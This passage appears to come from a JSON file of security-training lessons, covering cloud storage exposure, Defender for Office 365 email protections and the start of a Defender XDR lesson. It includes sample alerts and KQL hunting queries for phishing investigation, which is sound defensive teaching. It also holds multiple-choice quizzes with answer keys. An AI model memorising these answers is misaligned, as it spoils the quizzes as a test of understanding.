team.\n\n### Respond by closing and confirming\n\nWhen you find dangerous exposure: **make the bucket private / re-enable Block Public Access**, or **remove the over-broad security-group rule and replace it with a scoped source**. Then assess impact — if a bucket was public, determine what data it held and for how long, and check access logs (if enabled) for who reached it; if a port was open, hunt the host for signs of compromise such as brute-force success or unexpected processes. Finally, feed the fix back into prevention: enable the guardrail (Block Public Access, an SCP or Azure Policy forbidding `0.0.0.0/0` on admin ports) so the same mistake cannot recur, and pair every guardrail with an alert on attempts to violate it."
    },
    {
      "heading": "Real-World Breach Patterns and Prevention at Scale",
      "content": "Storage and network exposure is not a rare, exotic failure — it is one of the most common root causes of cloud data breaches across the industry, precisely because it requires no exploit, no malware, and no stolen credential at all. It only requires a mistake, and mistakes at cloud scale happen constantly.\n\n### The discovery timeline is often shockingly short\n\nSecurity researchers and criminal actors alike run **continuous internet-wide scanners** that enumerate public IP ranges for open ports and probe common storage-naming patterns (bucket names often mirror company names, project names, or predictable suffixes like `-backup` or `-prod`). The gap between a misconfiguration going live and an outside party finding it is frequently measured in **minutes to hours**, not days — which is why waiting for a scheduled weekly review to catch exposure is not a viable strategy on its own; the change-detection approach from the previous section exists precisely to close that gap.\n\n### Why the same mistake keeps happening\n\nA recurring pattern across publicly documented breaches: exposure is rarely the result of a deliberate decision. It is a **default that was never changed**, a **temporary rule opened for testing and forgotten**, or a **template/script copied from an example that happened to include a wildcard**. This is why prevention that depends on every individual engineer remembering the right setting does not scale — the fix has to be structural.\n\n### Prevention at scale\n\n- **Infrastructure as Code (IaC)** — tools like Terraform or AWS CloudFormation let engineers define buckets, security groups, and permissions as version-controlled code rather than manual console clicks. This makes exposure **reviewable before deployment**: automated policy-as-code scanners (checking for `0.0.0.0/0` on sensitive ports or `Principal: *` on storage) can block a risky change in a pull request, long before it ever reaches production.\n- **Account-wide guardrails** — AWS **Service Control Policies (SCPs)** at the Organizations level and **Azure Policy** at the management-group level can hard-block dangerous configurations account-wide, no matter what any individual engineer's own permissions would otherwise allow. This is the deny-always-wins mechanism from the authentication lesson, applied to infrastructure configuration instead of identity.\n- **Default-secure services** — increasingly, cloud providers themselves ship safer defaults (S3's Block Public Access is now on by default for new buckets), shifting the baseline so a deliberate, auditable action is required to create exposure rather than a deliberate action being required to prevent it.\n\n### Tying it back to the SOC's role\n\nGuardrails and IaC scanning reduce how often exposure happens, but they do not eliminate the need for a SOC — templates get exceptions, legacy resources predate the guardrails, and determined attackers specifically probe for the gaps. The analyst's job, built across this whole lesson, remains the same: know what safe configuration looks like, watch for the change events and posture findings that reveal when it isn't, and close the door fast when it's found open."
    }
  ],
  "keyTakeaways": [
    "Cloud object storage (S3 buckets / Azure Blob containers) is private by default but can be exposed to the entire internet by a bucket policy or ACL granting AllUsers/anonymous access with Block Public Access off — the root cause of countless data-spill breaches.",
    "Security groups (AWS) and NSGs (Azure) are the cloud firewall; the dangerous value is source 0.0.0.0/0 (the whole internet), and opening SSH (22), RDP (3389), or database ports (3306/1433/27017/6379/9200) to it invites brute-force and mass breaches.",
    "Access to a resource can be granted through an identity-based policy (attached to a user or role) or a resource-based policy (attached to the resource itself, like a bucket policy) — both are checked independently, so a bucket can be exposed by its own policy even when every IAM policy elsewhere looks perfectly locked down.",
    "Exposure extends beyond buckets and security groups to public database snapshots, shared managed disks, and publicly-accessible database flags; prevention at scale relies on Infrastructure as Code with pre-deployment policy scanning and account-wide guardrails (SCPs, Azure Policy) rather than relying on every engineer remembering the right setting.",
    "Detect exposure two ways: posture tools (AWS Config/Security Hub/Macie, Azure Defender for Cloud) find what is already open, and activity-log change events (PutBucketPolicy, PutBucketPublicAccessBlock off, AuthorizeSecurityGroupIngress from 0.0.0.0/0) catch the moment exposure is created.",
    "Defend with least exposure: keep storage private with Block Public Access enabled and share via pre-signed URLs/SAS tokens; open only necessary ports from the narrowest source, keep admin access behind VPN/bastion; and enforce guardrails (SCP/Azure Policy) with alerts on violations."
  ],
  "quiz": [
    {
      "question": "A security review finds an S3 bucket containing customer records that anyone on the internet can list and download without any credentials. Which combination of settings most directly produces this dangerous public exposure?",
      "options": [
        {
          "label": "The bucket is in an unused AWS region, which automatically makes all objects readable by anonymous users across the public internet by default.",
          "value": "a"
        },
        {
          "label": "A bucket policy or ACL grants read to everyone (AllUsers / principal *) while Block Public Access is disabled, so anonymous internet users can access it.",
          "value": "b"
        },
        {
          "label": "The bucket uses pre-signed URLs, which by design make every object permanently and publicly downloadable to anyone who visits the storage endpoint.",
          "value": "c"
        },
        {
          "label": "The bucket owner enabled Block Public Access, which in AWS is the setting that grants the AllUsers group full read access to the contents.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Public exposure happens when a bucket policy or ACL grants read to everyone (AllUsers / the * principal) and the Block Public Access guardrail is off, letting anonymous internet users list and download objects. Option a is wrong because region does not control public access. Option c misdescribes pre-signed URLs, which grant temporary, scoped access to a single object rather than making everything public. Option d inverts reality — Block Public Access prevents public exposure, it does not grant it."
    },
    {
      "question": "In the activity log you see an AuthorizeSecurityGroupIngress call adding an inbound rule that allows TCP port 3389 from 0.0.0.0/0, made by an unfamiliar identity from a foreign IP. Why is this a high-priority finding?",
      "options": [
        {
          "label": "It is low priority, because 0.0.0.0/0 restricts access to a single trusted address and port 3389 is only ever used for encrypted internal backups.",
          "value": "a"
        },
        {
          "label": "It exposes RDP to the entire internet, inviting brute-force and exploitation, and the unfamiliar actor and origin suggest an attacker opening a way in.",
          "value": "b"
        },
        {
          "label": "It simply enables outbound web browsing from the host, so the only concern is potential data usage costs rather than any security exposure at all.",
          "value": "c"
        },
        {
          "label": "It automatically closes port 3389 to the internet, so the finding is merely a routine hardening action that needs no further investigation by the SOC.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Source 0.0.0.0/0 means the entire internet, and port 3389 is RDP; opening RDP to the world invites brute-force and exploitation, while the unfamiliar identity and foreign origin suggest an attacker creating an entry point — a high-priority finding. Option a misstates 0.0.0.0/0 as a single address and 3389 as backups. Option c wrongly frames an inbound RDP rule as outbound browsing. Option d reverses the effect: the rule opens the port, it does not close it."
    },
    {
      "question": "A bucket's IAM-attached role policies all look correctly scoped, yet the bucket's contents are still downloadable by anyone with no AWS account. What most likely explains this, and where should the analyst look next?",
      "options": [
        {
          "label": "This is impossible; if every identity-based policy is scoped correctly, the bucket cannot be publicly accessible under any circumstances.",
          "value": "a"
        },
        {
          "label": "The bucket's own resource-based policy likely grants access independently, such as Principal: * — check the bucket policy itself, not just IAM.",
          "value": "b"
        },
        {
          "label": "The exposure must be caused by a security group rule, since bucket contents can only ever be exposed through network-layer firewall settings.",
          "value": "c"
        },
        {
          "label": "AWS support must have manually disabled the account's IAM system, since resource-based policies were deprecated and no longer affect access.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Identity-based and resource-based policies are evaluated independently; a bucket policy with Principal: * grants public access on its own, regardless of how tightly any IAM user or role policy is scoped, so the analyst must check the bucket policy itself. Option a wrongly assumes locked-down IAM guarantees a private bucket. Option c misapplies security groups, which do not govern S3 access. Option d invents a deprecation that has not happened."
    }
  ],
  "references": [
    "https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html",
    "https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-groups.html",
    "https://learn.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview",
    "https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-policy-alternatives-guidelines.html"
  ],
  "xp": 240,
  "estimatedMinutes": 50,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-defender-for-office-365-safe-links-attachments",
  "slug": "defender-for-office-365-safe-links-attachments",
  "title": "Defender for Office 365: Safe Links & Safe Attachments",
  "topic": "Microsoft Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Email is still the number-one way attackers get in, so the layer that inspects email before it reaches a user is one of the most important defences a Microsoft shop runs. Microsoft Defender for Office 365 (MDO) is that layer, and it sits on top of Exchange Online Protection (EOP) — the baseline anti-spam and anti-malware filter that ships with every Office 365 mailbox. Where EOP catches known-bad mail by signature and reputation, MDO adds active, behavioural protections: it detonates attachments in a sandbox, rewrites and re-checks links at the moment a user clicks, watches for brand and executive impersonation, and can even reach back into mailboxes to pull malicious mail out after it was already delivered. This lesson assumes no prior Microsoft 365 security knowledge. It explains what MDO does and how it sits above EOP, walks through Safe Attachments and Safe Links step by step, covers the anti-phishing and impersonation controls that sit alongside them, and finishes with how a SOC analyst actually reads MDO's alerts, hunts its telemetry with real queries, and contains a live phishing campaign from first report to full cleanup.",
  "sections": [
    {
      "heading": "What Defender for Office 365 Protects Against",
      "content": "**Microsoft Defender for Office 365 (MDO)** is the email and collaboration security layer of Microsoft's stack. It protects **Exchange Online** email, and also **SharePoint**, **OneDrive**, and **Teams**, against threats that basic anti-spam misses. Every Office 365 mailbox already has **Exchange Online Protection (EOP)** running underneath it — a baseline filter that blocks known spam and known malware by signature and sender reputation, the way a building's front-desk guard turns away visitors on a banned list. MDO is the specialist team behind that guard: it actually opens suspicious packages and follows suspicious links to see what they really do, catching the things a name-check on a list cannot.\n\nThe threats MDO is built to stop map directly to how real attacks arrive:\n\n- **Malicious attachments** — a document or file that carries malware or a macro that downloads it. Signature-based scanning misses brand-new (zero-day) files, so MDO *detonates* them.\n- **Malicious URLs** — a link that leads to a credential-harvesting page or a malware download. Attackers often make the link benign at send time and weaponise it later, so MDO checks links *at click time*.\n- **Phishing and impersonation** — mail pretending to be a trusted brand, your own domain, or a specific executive, a lead-in to business email compromise.\n- **Post-delivery threats** — mail that looked clean on arrival but is later found malicious; MDO can retroactively remove it.\n\nMDO comes in two plans. **Plan 1** provides the real-time preventive controls covered in this lesson — Safe Attachments, Safe Links, and anti-phishing. **Plan 2** adds the investigation and hunting tools a SOC leans on: Threat Explorer, Advanced Hunting tables, automated investigation and response, attack simulation training, and campaign views. Many organisations license Plan 2 through Microsoft 365 E5, which is why an analyst should not assume every tenant has the full toolset — checking which plan is active is one of the first things to confirm when you join a new environment.\n\nThe two flagship preventive features, and the ones you must understand in depth, are **Safe Attachments** and **Safe Links**. Together they close the exact gap that signature filtering leaves open: the *unknown* attachment and the *time-delayed* link. The sections that follow open each one up, then add the anti-phishing controls that guard against impersonation, and finally the analyst-facing side: alerts, hunting queries, and containment."
    },
    {
      "heading": "Safe Attachments — Detonating the Unknown",
      "content": "**Safe Attachments protects against malicious files by opening them in a secure, isolated environment before the recipient can — a technique called detonation or sandboxing.** The core problem it solves is the **zero-day** or never-before-seen file: traditional antivirus recognises known-bad files by signature, but an attacker who creates a brand-new malicious document has no signature yet, so signature scanning waves it through.\n\n**How it works, step by step:**\n\n1. An email arrives with an attachment. Ordinary anti-malware scanning (EOP) runs first and catches known threats.\n2. If the file is unknown, Safe Attachments **opens it in a sandbox** — a disposable virtual machine isolated from the real network — and *watches what it does*. Does it try to download more code, modify the system, or reach out to a suspicious server? This behavioural analysis, called **detonation**, judges the file by its actions rather than its signature.\n3. Based on the verdict, the mail is delivered, blocked, or the attachment is stripped.\n\nBecause detonation takes a little time, MDO offers **Dynamic Delivery**: the email body is delivered immediately with a placeholder while the attachment finishes detonating in the background, so users are not left waiting on a slow inbox. Safe Attachments policies can be set to **Block**, **Monitor**, **Replace**, or **Dynamic Delivery** modes, and equivalent protection covers files in **SharePoint, OneDrive, and Teams**, so a malicious file shared internally — not just emailed — is also caught.\n\n**Who does what, and when:** the *administrator* configures Safe Attachments policies once, choosing which mode applies to which recipients. Then, *every time* an email with an unknown attachment arrives (or a file lands in SharePoint/OneDrive/Teams), *MDO* detonates it and renders a verdict before — or, with Dynamic Delivery, in parallel with — delivery.\n\n**Why the SOC cares:** Safe Attachments verdicts are a rich signal. A detonation that flags a file as malicious tells you not just that a bad attachment was sent, but often *what it tried to do* during detonation, which helps you gauge intent and scope. A wave of the same malicious attachment (same file hash) arriving across many mailboxes in a short window is a campaign, not an isolated event, and it is exactly the kind of pattern you should hunt for and, if needed, purge everywhere it landed."
    },
    {
      "heading": "Safe Links — Checking the Link at Click Time",
      "content": "**Safe Links protects against malicious URLs by checking them at the moment a user clicks, not just when the mail arrives.** This timing is the whole point. Attackers routinely send a link that points to a harmless page at delivery — so it passes inspection — and then swap the page for a phishing or malware site hours later, after the mail is safely sitting in the inbox. A one-time scan at delivery cannot catch this **time-of-click** trick; Safe Links can, because it checks again every time.\n\n**How it works, step by step:**\n\n1. When mail is processed, MDO **rewrites** the URLs in the message so they point through a Microsoft checking service (you may notice links routed via a `safelinks.protection.outlook.com` address). The original destination is preserved inside the rewritten link.\n2. **At the moment the user clicks**, the click goes to Microsoft's service first, which checks the *current* reputation and verdict of the real destination in real time — not the reputation it had when the mail arrived.\n3. If the destination is now known-malicious, the user sees a **warning or block page** instead of the harmful site. If it is safe, they are forwarded on transparently, with little added delay.\n\nSafe Links also covers URLs in **Teams** messages and in **Office apps** (a link pasted into a Word document is checked too), and it works together with Safe Attachments — a link that leads to a file can trigger detonation of that file. Administrators tune Safe Links policies, for example whether to let users click through a warning page or block outright.\n\n**Who does what, and when:** the *administrator* enables Safe Links policies. *MDO* rewrites links as mail is delivered. Then, *each time a user clicks*, the checking service evaluates the live destination and allows, warns, or blocks.\n\n**Why the SOC cares:** Safe Links generates one of the most valuable signals in phishing investigations — the **URL click event**. It records *who clicked what, and when, and what the verdict was*. If ten users received a phishing link but the logs show only two actually clicked — and one clicked *through* a warning — you instantly know who to prioritise for password resets and follow-up, instead of treating all ten as equally exposed. This click-level visibility, combined with anti-phishing controls (next section) and **Zero-hour Auto Purge (ZAP)**, is what turns MDO from a filter into an investigation tool."
    },
    {
      "heading": "Anti-Phishing and Impersonation Protection",
      "content": "Safe Attachments and Safe Links stop malicious *payloads*. A large share of phishing carries no malware and no bad link at all — it is pure social engineering, a message that simply *looks* like it came from someone trustworthy and asks for money, credentials, or a favour. MDO's **anti-phishing policies** are the controls built specifically for that problem.\n\n### Impersonation protection\n\n**Impersonation protection** looks at the *display name* and *domain* of a message and asks: is this pretending to be someone it is not? Two flavours matter:\n\n- **User impersonation** — you name specific high-value people to protect, typically executives and finance staff. If a message arrives claiming to be from \"Jane Smith, CFO\" but the underlying sending address is not Jane's real mailbox, MDO flags it.\n- **Domain impersonation** — you protect your own domain (and can protect trusted partner domains). MDO catches lookalike domains — a message from `c0ntoso.com` or `contoso-invoices.com` pretending to be `contoso.com`.\n\n### Spoof intelligence and mailbox intelligence\n\n**Spoof intelligence** distinguishes *legitimate* spoofing (a newsletter service sending on your domain's behalf, which is normal and authorised) from *malicious* spoofing (an attacker forging your domain). It works alongside the email-authentication standards **SPF**, **DKIM**, and **DMARC**, which let a receiving mail system verify that a message claiming to be from a domain was actually authorised to send on that domain's behalf. **Mailbox intelligence** goes further and learns each user's normal contacts and communication patterns, so it can flag a message that claims to be from someone the user emails constantly but that breaks the usual pattern — for example, a sudden request to change a bank account.\n\n### Preset security policies\n\nRather than tuning dozens of individual settings, Microsoft offers **preset security policies** — Standard and Strict — that bundle sensible, Microsoft-recommended defaults for Safe Attachments, Safe Links, and anti-phishing together. Most organisations start from a preset and only customise where they have a specific business need, which reduces the chance of a misconfigured policy leaving a gap.\n\n**Why the SOC cares:** impersonation and spoof-intelligence detections are often the *first* sign of a business email compromise (BEC) attempt, arriving before any malware or link is even in play — a plain-text message asking someone in finance to change a wire transfer's destination account. Recognising that these detections exist, and knowing which named users and domains a tenant protects, tells you immediately whether a suspicious \"CEO fraud\" email should have been caught automatically or slipped through a gap in configuration."
    },
    {
      "heading": "Reading MDO Alerts and Logs",
      "content": "For a SOC analyst, MDO's value is the telemetry it produces, surfaced both as **alerts** in the Microsoft Defender portal and as **queryable events** in Advanced Hunting.\n\n### Alerts and the portal experience\n\nMDO raises alerts for events like a detected malware attachment, a user clicking a malicious URL, or a detected impersonation attempt. These flow into the unified **Microsoft Defender portal** (security.microsoft.com) and correlate into **incidents** alongside endpoint and identity signals (covered in the Defender XDR lesson). A simplified MDO alert looks like this:\n\n```\n{\n  \"alertId\": \"da637812345678900001\",\n  \"title\": \"Malicious URL clicked\",\n  \"severity\": \"High\",\n  \"category\": \"InitialAccess\",\n  \"serviceSource\": \"Microsoft Defender for Office 365\",\n  \"status\": \"New\",\n  \"entities\": [\n    { \"entityType\": \"User\", \"userPrincipalName\": \"j.cohen@contoso.com\" },\n    { \"entityType\": \"Url\", \"url\": \"hxxps://c0ntoso-verify.example/login\" },\n    { \"entityType\": \"Mailbox\", \"mailbox\": \"j.cohen@contoso.com\" }\n  ],\n  \"firstActivity\": \"2026-08-14T09:12:04Z\",\n  \"lastActivity\": \"2026-08-14T09:12:04Z\"\n}\n```\n\nThe fields to focus on first are **severity**, the **entities** (who and what is involved), and **status/classification**, which you set as you triage: true positive, false positive, or benign. With Plan 2, **Threat Explorer** lets you search all email by sender, subject, URL, or attachment and see delivery status and verdicts in one view — invaluable for scoping a phishing campaign quickly without writing a single query.\n\n### The hunting tables\n\nIn Advanced Hunting (its own lesson), MDO exposes a family of email tables every analyst should recognise:\n\n- **EmailEvents** — one row per message: sender, recipient, subject, and the delivery action and threat verdicts.\n- **EmailAttachmentInfo** — details of attachments, including detonation results.\n- **EmailUrlInfo** — the URLs contained in messages.\n- **UrlClickEvents** — the Safe Links click records: who clicked, when, and whether it was allowed or blocked.\n\nA typical phishing investigation stitches these together: start from an alert or a reported message, use **EmailEvents** to find every recipient of the same campaign, check **EmailAttachmentInfo**/**EmailUrlInfo** for the malicious payload, and pivot to **UrlClickEvents** to see who actually clicked. That last step separates *received* from *engaged* and drives your response priorities."
    },
    {
      "heading": "A Worked Phishing Investigation",
      "content": "Theory is easier to hold onto with a concrete walk-through. Suppose a user reports a suspicious email claiming to be an invoice from a supplier, and Threat Explorer confirms the same sender domain sent nearly identical mail to 60 mailboxes in the last hour.\n\n**Step 1 — scope the campaign.** In Advanced Hunting, find every message from the campaign:\n\n```\nEmailEvents\n| where Timestamp > ago(2h)\n| where SenderFromDomain == \"c0ntoso-invoices.example\"\n| project Timestamp, RecipientEmailAddress, Subject, DeliveryAction, ThreatTypes\n| sort by Timestamp desc\n```\n\nThis returns every recipient, whether the mail was delivered, quarantined, or blocked, and the verdict MDO already assigned each one — your first read on how big the problem is.\n\n**Step 2 — check what the message carried.** Join to the URL table to see the actual link, since that is what a user would have to click for the attack to succeed:\n\n```\nEmailEvents\n| where Timestamp > ago(2h)\n| where SenderFromDomain == \"c0ntoso-invoices.example\"\n| join kind=inner (EmailUrlInfo) on NetworkMessageId\n| project Timestamp, RecipientEmailAddress, Url\n```\n\n**Step 3 — find who actually clicked.** This is the step that turns a mass-received email into a prioritised response list:\n\n```\nUrlClickEvents\n| where Timestamp > ago(2h)\n| where Url has \"c0ntoso-invoices.example\"\n| project Timestamp, AccountUpn, ActionType, IPAddress\n```\n\n`ActionType` here tells you whether Safe Links **blocked** the click outright, let it through with a **warning the user clicked past**, or the destination was judged safe at that moment. Every row where a user reached the page is a candidate for an immediate password reset and a check of their sign-in history.\n\n**Step 4 — contain.** Back in the portal, you soft-delete or purge the remaining copies of the message tenant-wide (or trigger **Zero-hour Auto Purge**, covered next), submit a sample to Microsoft for reclassification, and hand the list of clickers to the identity team for credential resets and session revocation. Note how each step used a different table for a different question — EmailEvents for *scope*, EmailUrlInfo for *payload*, UrlClickEvents for *engagement* — which is the general pattern for any MDO investigation, not just this one."
    },
    {
      "heading": "Zero-Hour Auto Purge, Quarantine, and Submissions",
      "content": "Detection does not stop at the inbox door. MDO includes mechanisms to act on mail that is already sitting in mailboxes, which matters because verdicts can change *after* delivery.\n\n### Zero-hour Auto Purge (ZAP)\n\n**ZAP** re-evaluates delivered mail as new threat intelligence arrives, and automatically **moves or deletes** messages that are later found malicious — even though they already passed inspection and reached the inbox. This is the direct answer to the same time-of-click problem Safe Links solves for links, but applied to the whole message: a file or sender that looked clean an hour ago can be reclassified, and ZAP retroactively removes every copy across every mailbox it reached, without an analyst having to hunt each one down manually.\n\n### Quarantine\n\nMail that MDO or EOP blocks does not simply vanish — it typically lands in **quarantine**, a holding area where an admin (and sometimes the end user, depending on policy) can review it, release it if it turns out to be a false positive, or permanently delete it. Quarantine policies control who can see and release quarantined mail and are an important tuning lever: too permissive, and users release real phishing themselves; too restrictive, and legitimate mail gets stuck with no way out.\n\n### User reporting and Submissions\n\nWhen a user reports a suspicious message (via the built-in **Report Message** add-in or by forwarding it), it appears in the **Submissions** page for security team review. Analysts can also proactively submit a suspicious file, URL, or email to Microsoft here for reanalysis, feeding the outcome back into detection. A high volume of user-reported phishing for the *same* sender or subject is itself a signal worth correlating against Threat Explorer and EmailEvents, since it usually means the campaign in step one of the previous section is bigger than the single report suggested.\n\n### Bringing it together\n\nThe full lifecycle an analyst should keep in mind is: **prevent** (Safe Attachments/Safe Links/anti-phishing stop most of it before delivery) → **detect** (alerts, user reports, Threat Explorer, Advanced Hunting catch what got through or is reported) → **retroactively correct** (ZAP and manual purge remove what is now known bad) → **feed back** (Submissions improve future detection). Understanding where quarantine, ZAP, and Submissions sit in that lifecycle is what lets you answer the question every phishing incident eventually raises: *is this email still sitting in anyone's inbox right now, and if so, how do we get it out?*"
    }
  ],
  "keyTakeaways": [
    "Defender for Office 365 (MDO) sits above baseline Exchange Online Protection (EOP) and protects Exchange email plus SharePoint/OneDrive/Teams against malicious attachments, malicious URLs, impersonation/phishing, and post-delivery threats, with Plan 1 covering prevention and Plan 2 adding hunting/investigation tools.",
    "Safe Attachments detonates unknown files in an isolated sandbox and judges them by behaviour (catching zero-day files signatures miss), with Dynamic Delivery sending the body immediately while the attachment finishes detonating.",
    "Safe Links rewrites URLs and checks them at time-of-click, defeating the trick of a link that is benign at delivery and weaponised later; it produces the high-value UrlClickEvents record of who clicked what and when.",
    "Anti-phishing policies add impersonation protection (named users, domain lookalikes), spoof intelligence built on SPF/DKIM/DMARC, and mailbox intelligence — catching pure social-engineering BEC attempts that carry no malware or bad link at all.",
    "Analysts investigate in the Defender portal (alerts, incidents, Threat Explorer) and Advanced Hunting tables (EmailEvents scopes the campaign, EmailUrlInfo/EmailAttachmentInfo reveal the payload, UrlClickEvents shows who engaged), then contain with quarantine review, ZAP, and purge, feeding outcomes back through Submissions."
  ],
  "quiz": [
    {
      "question": "A phishing email contains a link that pointed to a harmless page when it was delivered on Monday, but the attacker replaced that page with a credential-harvesting site on Tuesday. How does Safe Links protect a user who clicks the link on Tuesday, and why does a one-time delivery scan fail here?",
      "options": [
        {
          "label": "Safe Links deletes every email that contains any URL on arrival, so the malicious message was already removed before the user could ever click it.",
          "value": "a"
        },
        {
          "label": "Safe Links rewrites the URL and checks the live destination at click time, so it catches the now-malicious site that a one-time delivery-time scan would have missed.",
          "value": "b"
        },
        {
          "label": "Safe Links permanently blocks the user's browser from opening any external website, which is why no phishing page can ever load after an email is received.",
          "value": "c"
        },
        {
          "label": "Safe Links scans the link only once when the mail arrives, so on Tuesday it relies entirely on the user noticing the page looks suspicious before entering credentials.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Safe Links rewrites URLs so a click is checked against the destination's live reputation at click time, which catches a link that was benign at delivery but weaponised later — exactly the time-of-click trick a single delivery-time scan cannot stop. Option a is wrong because Safe Links does not delete all mail containing URLs. Option c invents a total browser block that does not exist. Option d describes the very failure mode Safe Links is designed to overcome, not how it works."
    },
    {
      "question": "During a phishing investigation you confirm 40 users received the same malicious link. Which Microsoft Defender for Office 365 data source best tells you which of those users actually clicked it, so you can prioritise password resets?",
      "options": [
        {
          "label": "The DeviceProcessEvents table, because it records every process launched on endpoints and therefore lists which users opened the phishing email in Outlook.",
          "value": "a"
        },
        {
          "label": "The UrlClickEvents table, because Safe Links records who clicked which URL and when, and whether the click was allowed or blocked.",
          "value": "b"
        },
        {
          "label": "The Azure Activity Log, because it captures all management-plane API calls and therefore includes every email link a user chose to open.",
          "value": "c"
        },
        {
          "label": "The Safe Attachments detonation report, because sandbox analysis of the attachment reveals the full list of recipients who later clicked the message's link.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "UrlClickEvents is the Safe Links click record: it captures who clicked which URL, when, and the verdict, which is exactly what you need to separate users who merely received the link from those who engaged with it. DeviceProcessEvents tracks endpoint processes, not email clicks. The Azure Activity Log records cloud management API calls, not email link clicks. Safe Attachments detonates files and does not track who clicked a link."
    },
    {
      "question": "A message with no malicious link or attachment arrives claiming to be from the CFO, asking finance staff to urgently change a wire transfer's destination account. Which MDO control is specifically designed to catch this kind of attack?",
      "options": [
        {
          "label": "Safe Attachments, because sandbox detonation of the message body reveals text-based social-engineering requests the same way it detects malware.",
          "value": "a"
        },
        {
          "label": "Impersonation protection and spoof intelligence, because they analyse display name, domain, and sender patterns rather than needing a malicious payload to detect.",
          "value": "b"
        },
        {
          "label": "Dynamic Delivery, because it always blocks any email discussing financial transactions regardless of sender identity or content.",
          "value": "c"
        },
        {
          "label": "Zero-hour Auto Purge, because it prevents any message from ever reaching a mailbox in the first place, so this email could never have been delivered.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Impersonation protection and spoof intelligence are built for exactly this case: pure social engineering with no malware or malicious link, judged by display name, domain, and communication-pattern anomalies rather than payload behaviour. Safe Attachments only analyses files, not plain-text requests. Dynamic Delivery is a delivery timing mechanism, not a content filter for financial topics. ZAP acts on mail after delivery, not before."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/defender-office-365/mdo-about",
    "https://learn.microsoft.com/en-us/defender-office-365/safe-attachments-about",
    "https://learn.microsoft.com/en-us/defender-office-365/safe-links-about",
    "https://learn.microsoft.com/en-us/defender-office-365/anti-phishing-policies-about",
    "https://learn.microsoft.com/en-us/defender-office-365/zero-hour-auto-purge"
  ],
  "xp": 240,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-defender-xdr-alerts-incidents-timeline",
  "slug": "defender-xdr-alerts-incidents-device-timeline",
  "title": "Microsoft Defender XDR: Alerts, Incidents & Device Timeline",
  "topic": "Microsoft Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "A single attack rarely trips just one sensor. The same intrusion might raise an endpoint alert when malware runs, an identity alert when a stolen account signs in, and an email alert for the phishing message that started it all. Microsoft Defender XDR exists to stitch those separate signals into one coherent story. This lesson explains how the unified Defender portal turns raw alerts into correlated incidents, walks through real alert and incident JSON so you can see exactly what fields an analyst reads, covers the automated investigation that can run alongside a human, and shows how the device timeline lets you reconstruct precisely what happened on a machine, second by second. By the end you should be able to explain, in concrete terms, the triage path from a single detection through to a contained, closed case.",
  "sections": [
    {
      "heading": "One Portal, Many Sensors",
      "content": "**Microsoft Defender XDR** (extended detection and response) is the umbrella that brings Microsoft's individual security products together into a single investigation experience at **security.microsoft.com**, the **Microsoft Defender portal**. The word *extended* is the key idea: instead of each product having its own separate console and its own separate alerts, XDR correlates signals *across* them.\n\nThe main sensors feeding into it are:\n\n- **Microsoft Defender for Endpoint (MDE)** — the EDR on laptops and servers; sees processes, files, network connections, and registry changes.\n- **Microsoft Defender for Office 365 (MDO)** — email and collaboration; sees phishing, malicious attachments, and link clicks.\n- **Microsoft Defender for Identity (MDI)** — on-premises Active Directory signals; sees credential attacks like Kerberoasting and lateral movement.\n- **Microsoft Defender for Cloud Apps (MDCA)** — cloud app activity and shadow IT.\n- **Microsoft Entra ID Protection** — risky sign-ins and risky users.\n\nEach sensor watches a different slice of the environment. On their own, they produce a flood of individual alerts that an analyst would otherwise triage one by one, with no built-in sense of which belong together. XDR's job is to change that: it treats the whole estate as one system and asks, \"which of these alerts are actually the same attack?\"\n\nThe practical payoff is enormous. An analyst working in the unified portal sees a phishing email, the endpoint it detonated on, and the account subsequently misused as parts of *one* case, not three disconnected tickets. That is the difference between drowning in alerts and understanding an attack. The next sections break down the two building blocks of that experience — the **alert** (a single detection) and the **incident** (the correlated story) — then the automation that can act alongside a human, and finally the **device timeline** that lets you zoom all the way in on one machine."
    },
    {
      "heading": "Alerts — A Single Detection",
      "content": "An **alert** is the atomic unit of detection: one signal that something suspicious or malicious happened. When MDE sees a known-bad process launch, when MDO detonates a malicious attachment, or when Identity Protection scores a sign-in as high risk, each raises an alert.\n\nEvery alert carries a consistent set of information an analyst reads to triage it. A simplified alert looks like this:\n\n```\n{\n  \"alertId\": \"da637812345678900042\",\n  \"title\": \"Suspicious PowerShell command line\",\n  \"category\": \"CommandAndControl\",\n  \"severity\": \"Medium\",\n  \"status\": \"New\",\n  \"classification\": null,\n  \"detectionSource\": \"MicrosoftDefenderForEndpoint\",\n  \"mitreTechniques\": [\"T1059.001\"],\n  \"entities\": [\n    { \"entityType\": \"Device\", \"deviceName\": \"FIN-LAPTOP-07\" },\n    { \"entityType\": \"User\", \"accountName\": \"r.katz\" },\n    { \"entityType\": \"Process\", \"fileName\": \"powershell.exe\" }\n  ],\n  \"firstActivity\": \"2026-08-14T13:02:11Z\",\n  \"lastActivity\": \"2026-08-14T13:02:11Z\"\n}\n```\n\nRead it field by field: **title and category** describe what was detected and where it fits — the category here aligns to a MITRE ATT&CK tactic, and `mitreTechniques` names the specific technique. **Severity** (Informational, Low, Medium, High) is a first cut at urgency. **Status** moves from New to In Progress to Resolved, and the analyst sets a **classification** (true positive, false positive, benign) when closing it. The **entities** — the device, user, and process involved — are what let this alert be linked to others. The **detection source** tells you which Defender product raised it.\n\nThe critical thing to understand is that **an alert is a fragment, not the whole picture.** This single \"suspicious PowerShell\" alert might be an admin script or the middle of a live intrusion — the alert alone cannot tell you which. Triaging alerts purely one at a time is how analysts burn out and miss real attacks: high alert volume plus no correlation means the important signal hides in the noise.\n\nThis is exactly the problem incidents solve. Because each alert names its **entities** (this device, 